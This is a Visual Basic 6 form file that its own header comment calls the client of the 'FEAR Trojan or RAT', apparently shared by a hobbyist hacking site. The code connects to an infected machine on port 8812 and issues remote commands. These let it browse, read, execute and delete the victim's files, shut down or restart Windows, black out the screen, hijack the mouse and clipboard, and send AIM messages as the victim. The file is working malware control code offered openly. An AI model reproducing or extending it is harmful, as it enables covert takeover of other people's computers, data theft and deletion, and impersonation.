VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{BDC217C8-ED16-11CD-956C-0000C04E4C0A}#1.1#0"; "TABCTL32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Fear - Client"
   ClientHeight    =   5490
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3780
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   5490
   ScaleWidth      =   3780
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock WS 
      Left            =   1515
      Top             =   240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin TabDlg.SSTab TABS 
      Height          =   4365
      Left            =   0
      TabIndex        =   0
      Top             =   855
      Width           =   3780
      _ExtentX        =   6668
      _ExtentY        =   7699
      _Version        =   393216
      Tabs            =   4
      Tab             =   1
      TabsPerRow      =   4
      TabHeight       =   520
      WordWrap        =   0   'False
      ShowFocusRect   =   0   'False
      OLEDropMode     =   1
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      TabCaption(0)   =   "Basic"
      Tab(0).ControlEnabled=   0   'False
      Tab(0).Control(0)=   "cmdOpenCD"
      Tab(0).Control(1)=   "cmdCloseCD"
      Tab(0).Control(2)=   "cmdPlayCD"
      Tab(0).Control(3)=   "cmdStopCD"
      Tab(0).Control(4)=   "cmdCapsOn"
      Tab(0).Control(5)=   "cmdCapsOff"
      Tab(0).Control(6)=   "cmdNumsOn"
      Tab(0).Control(7)=   "cmdNumsOff"
      Tab(0).Control(8)=   "cmdScrollOn"
      Tab(0).Control(9)=   "cmdScrollOff"
      Tab(0).Control(10)=   "cmdBlackout"
      Tab(0).Control(11)=   "cmdRestart"
      Tab(0).Control(12)=   "cmdShutdown"
      Tab(0).Control(13)=   "cmdKrazyKeys"
      Tab(0).Control(14)=   "cmdChat"
      Tab(0).Control(15)=   "cmdCloseServer"
      Tab(0).Control(16)=   "cmdClip"
      Tab(0).Control(17)=   "cmdWWW"
      Tab(0).Control(18)=   "Command2"
      Tab(0).Control(19)=   "txtMessage"
      Tab(0).Control(20)=   "txtWWW"
      Tab(0).Control(21)=   "txtClip"
      Tab(0).Control(22)=   "cmdPrint"
      Tab(0).Control(23)=   "cmdMouse"
      Tab(0).ControlCount=   24
      TabCaption(1)   =   "Explorer"
      Tab(1).ControlEnabled=   -1  'True
      Tab(1).Control(0)=   "lbldriveinf"
      Tab(1).Control(0).Enabled=   0   'False
      Tab(1).Control(1)=   "cmbDrives"
      Tab(1).Control(1).Enabled=   0   'False
      Tab(1).Control(2)=   "cmdListDrives"
      Tab(1).Control(2).Enabled=   0   'False
      Tab(1).Control(3)=   "List1"
      Tab(1).Control(3).Enabled=   0   'False
      Tab(1).ControlCount=   4
      TabCaption(2)   =   "AIM"
      Tab(2).ControlEnabled=   0   'False
      Tab(2).Control(0)=   "txtJoinChat"
      Tab(2).Control(0).Enabled=   0   'False
      Tab(2).Control(1)=   "txtChatNAme"
      Tab(2).Control(1).Enabled=   0   'False
      Tab(2).Control(2)=   "txtIMSN"
      Tab(2).Control(2).Enabled=   0   'False
      Tab(2).Control(3)=   "cmdAIMIM"
      Tab(2).Control(3).Enabled=   0   'False
      Tab(2).Control(4)=   "cmdAIMChat"
      Tab(2).Control(4).Enabled=   0   'False
      Tab(2).Control(5)=   "txtAIMIM"
      Tab(2).Control(5).Enabled=   0   'False
      Tab(2).Control(6)=   "txtAIMChat"
      Tab(2).Control(6).Enabled=   0   'False
      Tab(2).Control(7)=   "Label4"
      Tab(2).Control(7).Enabled=   0   'False
      Tab(2).ControlCount=   8
      TabCaption(3)   =   "Info"
      Tab(3).ControlEnabled=   0   'False
      Tab(3).Control(0)=   "cmdUpdateInfo"
      Tab(3).Control(1)=   "txtInfo"
      Tab(3).Control(2)=   "Label3"
      Tab(3).ControlCount=   3
      Begin VB.CommandButton cmdMouse 
         Caption         =   "Move Mouse"
         Height          =   285
         Left            =   -74865
         TabIndex        =   45
         Top             =   3195
         Width           =   1500
      End
      Begin VB.CommandButton cmdPrint 
         Caption         =   "Print Text..."
         Height          =   285
         Left            =   -74865
         TabIndex        =   44
         Top             =   2925
         Width           =   1500
      End
      Begin VB.TextBox txtClip 
         Height          =   315
         Left            =   -74805
         TabIndex        =   35
         Text            =   "New Text"
         Top             =   2145
         Width           =   1350
      End
      Begin VB.TextBox txtWWW 
         Height          =   315
         Left            =   -74805
         TabIndex        =   9
         Text            =   "www.ulair.cjb.net"
         Top             =   1455
         Width           =   1350
      End
      Begin VB.TextBox txtMessage 
         Height          =   315
         Left            =   -74805
         TabIndex        =   6
         Text            =   "Message Text"
         Top             =   765
         Width           =   1365
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Message Box"
         Height          =   270
         Left            =   -74805
         TabIndex        =   7
         Top             =   1095
         Width           =   1380
      End
      Begin VB.CommandButton cmdWWW 
         Caption         =   "Webpage Popup"
         Height          =   270
         Left            =   -74805
         TabIndex        =   10
         Top             =   1785
         Width           =   1365
      End
      Begin VB.CommandButton cmdClip 
         Caption         =   "Set Clipboard Text"
         Height          =   270
         Left            =   -74835
         TabIndex        =   36
         Top             =   2475
         Width           =   1425
      End
      Begin VB.CommandButton cmdCloseServer 
         Caption         =   "&Close Remote Server"
         Height          =   450
         Left            =   -73155
         TabIndex        =   34
         Top             =   3795
         Width           =   1800
      End
      Begin VB.ListBox List1 
         Height          =   2985
         Left            =   90
         TabIndex        =   41
         Top             =   765
         Width           =   3555
      End
      Begin VB.CommandButton cmdListDrives 
         Caption         =   "List Drives"
         Height          =   315
         Left            =   2745
         TabIndex        =   40
         Top             =   390
         Width           =   900
      End
      Begin VB.ComboBox cmbDrives 
         Height          =   315
         Left            =   120
         TabIndex        =   39
         Text            =   "cmbDrives"
         Top             =   405
         Width           =   2595
      End
      Begin VB.CommandButton cmdChat 
         Caption         =   "Chat With Server..."
         Height          =   300
         Left            =   -73140
         TabIndex        =   38
         Top             =   2535
         Width           =   1740
      End
      Begin VB.CommandButton cmdKrazyKeys 
         Caption         =   "Krazy Key Locks"
         Height          =   270
         Left            =   -73155
         TabIndex        =   21
         Top             =   2145
         Width           =   1770
      End
      Begin VB.CommandButton cmdShutdown 
         Caption         =   "Shutdown Windows"
         Height          =   270
         Left            =   -73155
         TabIndex        =   23
         Top             =   3435
         Width           =   1785
      End
      Begin VB.CommandButton cmdRestart 
         Caption         =   "Restart Windows"
         Height          =   270
         Left            =   -73155
         TabIndex        =   22
         Top             =   3180
         Width           =   1785
      End
      Begin VB.CommandButton cmdBlackout 
         Caption         =   "Blackout Screen..."
         Height          =   270
         Left            =   -73155
         TabIndex        =   37
         Top             =   2925
         Width           =   1785
      End
      Begin VB.CommandButton txtJoinChat 
         Caption         =   "Join Chat"
         Height          =   270
         Left            =   -74070
         TabIndex        =   33
         Top             =   1440
         Width           =   1755
      End
      Begin VB.TextBox txtChatNAme 
         Height          =   300
         Left            =   -74070
         TabIndex        =   32
         Text            =   "Chatname"
         Top             =   1140
         Width           =   1740
      End
      Begin VB.TextBox txtIMSN 
         Height          =   285
         Left            =   -74055
         TabIndex        =   31
         Text            =   "SN"
         Top             =   2415
         Width           =   1755
      End
      Begin VB.CommandButton cmdAIMIM 
         Caption         =   "Send Message To IM"
         Height          =   270
         Left            =   -74055
         TabIndex        =   30
         Top             =   3015
         Width           =   1755
      End
      Begin VB.CommandButton cmdAIMChat 
         Caption         =   "Send To Chat"
         Height          =   270
         Left            =   -74055
         TabIndex        =   29
         Top             =   2100
         Width           =   1755
      End
      Begin VB.TextBox txtAIMIM 
         Height          =   285
         Left            =   -74055
         TabIndex        =   28
         Text            =   "Message"
         Top             =   2715
         Width           =   1755
      End
      Begin VB.TextBox txtAIMChat 
         Height          =   300
         Left            =   -74055
         TabIndex        =   27
         Text            =   "Message"
         Top             =   1800
         Width           =   1740
      End
      Begin VB.CommandButton cmdUpdateInfo 
         Caption         =   "Update Info..."
         Height          =   300
         Left            =   -74910
         TabIndex        =   25
         Top             =   3975
         Width           =   3585
      End
      Begin VB.TextBox txtInfo 
         Height          =   3270
         Left            =   -74910
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   24
         Top             =   645
         Width           =   3600
      End
      Begin VB.CommandButton cmdScrollOff 
         Caption         =   "Scroll Off"
         Height          =   255
         Left            =   -72255
         TabIndex        =   20
         Top             =   1905
         Width           =   870
      End
      Begin VB.CommandButton cmdScrollOn 
         Caption         =   "Scroll On"
         Height          =   255
         Left            =   -73155
         TabIndex        =   19
         Top             =   1905
         Width           =   915
      End
      Begin VB.CommandButton cmdNumsOff 
         Caption         =   "Nums Off"
         Height          =   270
         Left            =   -72255
         TabIndex        =   18
         Top             =   1650
         Width           =   870
      End
      Begin VB.CommandButton cmdNumsOn 
         Caption         =   "Nums On"
         Height          =   270
         Left            =   -73155
         TabIndex        =   17
         Top             =   1650
         Width           =   915
      End
      Begin VB.CommandButton cmdCapsOff 
         Caption         =   "Caps Off"
         Height          =   270
         Left            =   -72255
         TabIndex        =   16
         Top             =   1395
         Width           =   870
      End
      Begin VB.CommandButton cmdCapsOn 
         Caption         =   "Caps On"
         Height          =   270
         Left            =   -73155
         TabIndex        =   15
         Top             =   1395
         Width           =   915
      End
      Begin VB.CommandButton cmdStopCD 
         Caption         =   "Stop CD"
         Height          =   270
         Left            =   -72255
         TabIndex        =   14
         Top             =   1005
         Width           =   870
      End
      Begin VB.CommandButton cmdPlayCD 
         Caption         =   "Play CD"
         Height          =   270
         Left            =   -73155
         TabIndex        =   13
         Top             =   1005
         Width           =   915
      End
      Begin VB.CommandButton cmdCloseCD 
         Caption         =   "Close CD"
         Height          =   270
         Left            =   -72255
         TabIndex        =   12
         Top             =   750
         Width           =   870
      End
      Begin VB.CommandButton cmdOpenCD 
         Caption         =   "Open CD"
         Height          =   270
         Left            =   -73155
         TabIndex        =   11
         Top             =   750
         Width           =   915
      End
      Begin VB.Label Label4 
         Alignment       =   2  'Center
         Caption         =   "The following commands can only be used if the remote computer is signed on to AIM."
         Height          =   660
         Left            =   -74940
         TabIndex        =   43
         Top             =   405
         Width           =   3630
      End
      Begin VB.Label lbldriveinf 
         Alignment       =   2  'Center
         Caption         =   "drive info"
         Height          =   480
         Left            =   105
         TabIndex        =   42
         Top             =   3795
         Width           =   3510
      End
      Begin VB.Label Label3 
         Caption         =   "Server Information:"
         BeginProperty Font 
            Name            =   "Verdana"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   240
         Left            =   -74910
         TabIndex        =   26
         Top             =   390
         Width           =   3510
      End
   End
   Begin MSComctlLib.StatusBar SB 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   5
      Top             =   5235
      Width           =   3780
      _ExtentX        =   6668
      _ExtentY        =   450
      Style           =   1
      SimpleText      =   "Fear Client - Idle"
      ShowTips        =   0   'False
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
      EndProperty
   End
   Begin VB.Frame Frame1 
      Caption         =   "Remote Connection Info"
      BeginProperty Font 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   825
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   3780
      Begin VB.CommandButton cmdDisconnect 
         Caption         =   "Disconnect"
         Height          =   285
         Left            =   2520
         TabIndex        =   8
         Top             =   480
         Width           =   975
      End
      Begin VB.CommandButton cmdConnect 
         Caption         =   "Connect"
         Height          =   285
         Left            =   2520
         TabIndex        =   4
         Top             =   210
         Width           =   975
      End
      Begin VB.TextBox txtIP 
         Height          =   285
         Left            =   975
         TabIndex        =   2
         Text            =   "127.0.0.1"
         Top             =   300
         Width           =   1350
      End
      Begin VB.Label Label1 
         Alignment       =   1  'Right Justify
         Caption         =   "Remote IP:"
         Height          =   225
         Left            =   105
         TabIndex        =   3
         Top             =   300
         Width           =   795
      End
   End
   Begin VB.Menu mnufiles 
      Caption         =   "mnuFiles"
      Visible         =   0   'False
      Begin VB.Menu mnuFilesView 
         Caption         =   "View..."
      End
      Begin VB.Menu mnudiv1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuExecute 
         Caption         =   "Execute"
      End
      Begin VB.Menu mnuPlayMedia 
         Caption         =   "Play Media"
      End
      Begin VB.Menu mnufilesdelete 
         Caption         =   "Delete"
      End
      Begin VB.Menu mnudiv2 
         Caption         =   "-"
      End
      Begin VB.Menu mnuFilesNew 
         Caption         =   "New..."
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
' Title: FEAR Trojan or RAT (client)
' Author: Alan Walker of The Underground Lair
'
' 2.0 will be way better then this example so check back SOON!
'
' http://www.ulair.cjb.net
'
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Public NameOfFile As String
Private Sub cmbDrives_Change()
cmbDrives.SelStart = Len(cmbDrives.Text)
End Sub

Private Sub cmbDrives_Click()
SD "files " & cmbDrives.Text
End Sub

Private Sub cmbDrives_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = 13 Then
    SD "files " & cmbDrives.Text
End If
End Sub

Private Sub cmdAIMChat_Click()
SD "aimchat " & txtAIMChat
End Sub

Private Sub cmdAIMIM_Click()
SD "aimim " & txtIMSN & ":" & txtAIMIM
End Sub

Private Sub cmdBlackout_Click()
frmBO.Show , Me
End Sub

Private Sub cmdCapsOff_Click()
SD "capsoff"
End Sub

Private Sub cmdCapsOn_Click()
SD "capson"
End Sub

Private Sub cmdChat_Click()
frmChat.sNick = InputBox("What is you handle?", "Nickname", "Client")
SD "chat"
frmChat.Show , Me
End Sub

Private Sub cmdClip_Click()
SD "setclip " & txtClip  ' Set server's clipboard text
End Sub

Private Sub cmdCloseCD_Click()
SD "closecd"
End Sub

Private Sub cmdCloseServer_Click()
SD "closeserver"
End Sub

Private Sub cmdConnect_Click()
WS.Close
WS.Connect txtIP, 8812 ' Connect to server
End Sub

Private Sub cmdDisconnect_Click()
SD "close" ' Disconnect
SB.SimpleText = "Fear Client - Idle" ' Set status to "Idle"
End Sub

Private Sub cmdKrazyKeys_Click()
SD "krazykeys"
End Sub

Private Sub cmdListDrives_Click()
SD "listdrives" ' List remote computer's drives
End Sub

Private Sub cmdMouse_Click()
frmMouse.Show , Me
End Sub

Private Sub cmdNumsOff_Click()
SD "numsoff"
End Sub

Private Sub cmdNumsOn_Click()
SD "numson"
End Sub

Private Sub cmdOpenCD_Click()
SD "opencd"
End Sub

Private Sub cmdPlayCD_Click()
SD "playcd"
End Sub

Private Sub cmdPrint_Click()
frmPrint.Show , Me
End Sub

Private Sub cmdRestart_Click()
'Restart Server's comp
Select Case MsgBox("If you restart windows on the server's computer you will loose the connection. Do you still wish to continue?", vbQuestion + vbYesNo, "Are You Sure?")
Case vbYes
SD "winrestart"
Case vbNo
Exit Sub
End Select
End Sub

Private Sub cmdScrollOff_Click()
SD "scrolloff"
End Sub

Private Sub cmdScrollOn_Click()
SD "scrollon"
End Sub

Private Sub cmdShutdown_Click()
' Shutdown server's comp
Select Case MsgBox("If you shutdown windows on the server's computer you will loose the connection. Do you still wish to continue?", vbQuestion + vbYesNo, "Are You Sure?")
Case vbYes
SD "winshutdown"
Case vbNo
Exit Sub
End Select
End Sub

Private Sub cmdStopCD_Click()
SD "stopcd"
End Sub

Private Sub cmdWhoIMsn_Click()
SD "imsn?"
End Sub

Private Sub cmdUpdateInfo_Click()
SD "updateinfo"  ' Update the remote computee's information
End Sub

Private Sub cmdWWW_Click()
SD "www " & txtWWW
End Sub

Private Sub Command2_Click()
SD "msg " & txtMessage
End Sub

Private Sub Command7_Click()

End Sub

Private Sub List1_Click()
If List1.List(List1.ListIndex) = ".." Then
    Exit Sub
End If
If Mid(List1.List(List1.ListIndex), 2, 1) = ":" Then
    cmbDrives.Text = List1.List(List1.ListIndex)
    dir = Mid(List1.List(List1.ListIndex), 1, 3)
Else
    cmbDrives.Text = dir & List1.Text 'dir & List1.List(List1.ListIndex)
End If
End Sub

Private Sub List1_DblClick()
If List1.List(List1.ListIndex) = ".." Then
    For i = Len(cmbDrives.Text) - 1 To 1 Step -1
        If Mid(cmbDrives.Text, i, 1) = "\" Then
            cmbDrives.Text = Mid(cmbDrives.Text, 1, i)
            SD "files " & cmbDrives.Text
            Exit Sub
        End If
    Next i
    Exit Sub
End If
If Mid(List1.List(List1.ListIndex), 2, 1) = ":" Then
    cmbDrives.Text = List1.List(List1.ListIndex)
    dir = List1.List(List1.ListIndex)
Else
    cmbDrives.Text = CurrentDir & List1.List(List1.ListIndex)
End If
SD "files " & cmbDrives.Text
End Sub

Private Sub List1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If List1.Text = "" Then Exit Sub
If Button = 2 Then frmMain.PopupMenu mnufiles
End Sub

Private Sub mnuExecute_Click()
SD "openit " & cmbDrives.Text
End Sub

Private Sub mnufilesdelete_Click()
SD "deleteit " & cmbDrives.Text
End Sub

Private Sub mnuFilesView_Click()
SD "sendtxtfile " & cmbDrives.Text
NameOfFile = cmbDrives.Text
End Sub

Private Sub mnuPlayMedia_Click()
SD "playmedia " & cmbDrives.Text
End Sub

Private Sub txtJoinChat_Click()
SD "goaimchat " & txtChatNAme
End Sub

Private Sub txtWhoIMSN_Change()

End Sub

Private Sub WS_DataArrival(ByVal BytesTotal As Long)
Dim ArrayTemp() As String
    Dim aTemp() As String
    Dim sServerCommand As String, lSpace As Long
    Dim Arg1 As String, Arg2 As String, i As Integer
    Dim i1 As Long, i2 As Long, i3 As Long, i4 As Long, i5 As Long
    Dim iTemp As Integer
    Dim arTemp() As String
    Dim sTemp As String, sTemp2 As String
    
Dim NewData As String
    WS.GetData NewData, vbString
    
    Dim aCommandList() As String
    aCommandList = Split(NewData, cMsgSep)
    
    Dim nCount As Integer
    For nCount = LBound(aCommandList) To UBound(aCommandList)
        If Trim$(aCommandList(nCount)) = "" Then
            GoTo Reset:
        End If
        
        NewData = aCommandList(nCount)
        
        ' Reset some variables
        sTemp = ""
        DoEvents
        
        lSpace = InStr(1, NewData, " ")
        If lSpace <> 0 Then
            sServerCommand = Trim$(LCase$(Mid$(NewData, 1, lSpace - 1)))
            
            ' Get arguments
            If InStr(lSpace + 1, NewData, ":") <> 0 Then
                Arg1 = Mid$(NewData, lSpace + 1, InStr(lSpace + 1, NewData, ":") - (lSpace + 1))
                Arg2 = Mid$(NewData, InStr(lSpace + 1, NewData, ":") + 1)
            End If
        Else
            sServerCommand = Trim$(LCase$(NewData))
        End If
        '"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
        
        Select Case sServerCommand
        Case "connected"  ' Server say that you are successfully connected
        SB.SimpleText = "Fear Client - Connected (" & WS.RemoteHostIP & ")"
        GoTo Reset
        
        Case "disconnected" ' Server Closes
        SB.SimpleText = "Fear Client - Idle"
        GoTo Reset
        
        Case "drive" ' Show server's drive
        DispDrives Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "files" ' Show server's files
        DispFiles Mid$(NewData, lSpace + 1)
        GoTo Reset
        
        Case "sendtxtfile" ' Recieve text file
        Load frmText
        frmText.Caption = NameOfFile
        frmText.Visible = True
        frmText.txtText.Text = Mid$(NewData, lSpace + 1)
        GoTo Reset
          
        Case "info" ' Recieve Info
           txtInfo = Mid$(NewData, lSpace + 1)
           GoTo Reset
           
           Case "err" ' Error from server
           errmsg Mid$(NewData, lSpace + 1)
           GoTo Reset
           
        Case "chatmsg" ' Message for chat
        
        Dim ChatMsg, ChatName As String
        
         ChatMsg = Trim$(Arg2)
         ChatName = Trim$(Arg1)
         
         frmChat.addChat Arg1, Arg2
         
         GoTo Reset
           
           End Select
           '"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
           
Reset:
        DoEvents
    Next nCount
End Sub

Private Sub WSN_Connect()

End Sub

Private Sub WSN_ConnectionRequest(ByVal requestID As Long)
WS.Close
WS.Accept requestID
End Sub
